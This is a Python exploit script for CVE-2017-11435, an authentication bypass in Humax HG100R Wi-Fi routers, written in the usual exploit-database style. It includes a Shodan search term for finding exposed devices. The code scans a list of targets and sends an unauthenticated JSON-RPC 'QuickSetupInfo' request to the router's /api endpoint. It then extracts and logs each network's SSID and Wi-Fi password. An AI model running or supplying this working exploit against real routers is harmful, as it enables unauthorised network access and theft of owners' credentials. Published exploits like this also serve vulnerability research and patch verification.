# coding: utf-8
# Exploit Title: Humax HG100R-* Authentication Bypass
# Date: 14/09/2017
# Exploit Author: Kivson
# Vendor Homepage: http://humaxdigital.com
# Version: VER 2.0.6
# Tested on: OSX Linux
# CVE : CVE-2017-11435
# shodan dork: HUMAX Co.
# The Humax Wi-Fi Router model HG100R-* 2.0.6 is prone to an authentication bypass vulnerability via specially
# crafted requests to the management console. The bug is exploitable remotely when the router is configured to
# expose the management console.
# The router is not validating the session token while returning answers for some methods in url '/api'.
# An attacker can use this vulnerability to retrieve sensitive information such
# as private/public IP addresses, SSID names, and passwords.

import requests
import logging
import httplib2

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green

class Humax():

    def __init__(self, target_list):
        self.target_list = target_list
        self.findings =[]

    def check_host(self, target, port):
        """
        Send testing request to server to check if it responds with a 200 to any requests
        :param target: string
        :param port: string
        :return: boolean
        """
        url = target+':'+port
        test_strings = ['/sjf_hdid','/s_a?jghjf/','/']
        response = 0
        errors = 0
        for test in test_strings:
            try:
                conn = httplib2.Http(disable_ssl_certificate_validation=True)
                if port == '443':
                    try:
                        resp, content = conn.request('https://' + url + test, 'GET')
                        if resp['status'] == '200':
                            response += 1
                    except:
                        pass
                else:
                    resp, content = conn.request('http://' + url + test, 'HEAD')

                if resp['status'] == '200':
                    response += 1

            except ConnectionError as e:
                errors += 1
                logging.debug('Error: '+str(e))

        if errors == 3:
            logging.debug(R+'Error limit reached for host %s:%s' %(target,port)+W)
            return False

        elif response == 3:
            logging.debug(R+'Ambiguous response from web server on %s:%s. All URIs return status 200' %(target, port)+W)
            return False

        return True

    def run(self):
        for target in self.target_list:
            ip = target.split(':')[0]
            port = target.split(':')[1]
            logging.info('Testing: %s:%s' % (ip, port))
            if self.check_host(ip,port):
                self.exploit(ip, port)

        return self.findings

    def exploit(self, ip, port):
        host = 'http://'+ip+':'+port
        path = '/api'
        payload = '{"method":"QuickSetupInfo","id":90,"jsonrpc":"2.0"}'
        try:
            response = requests.post(host + path, data=payload)
            response.raise_for_status()
            if 'result' not in response.json() or 'WiFi_Info' not in response.json()['result'] or 'wlan' not in \
                    response.json()['result']['WiFi_Info']:
                logging.warning(R+'Error, target may be no exploitable'+W)
                return
            for wlan in response.json()['result']['WiFi_Info']['wlan']:
                result = 'Wifi data found:'+W+'\nSSID: %s' % wlan["ssid"] +'\nPWD: %s' % wlan["password"]
                logging.info(G+result+W)
                finding = ip + ';' + port + ';' + 'HTTP' + ';' + 'Credentials Disclosure' + ';' + 'Humax' + ';' + result
                self.findings.append(finding)
        except Exception as e:
            logging.warning('Error with host: %s:%s Details: %s'%(ip,port,str(e)))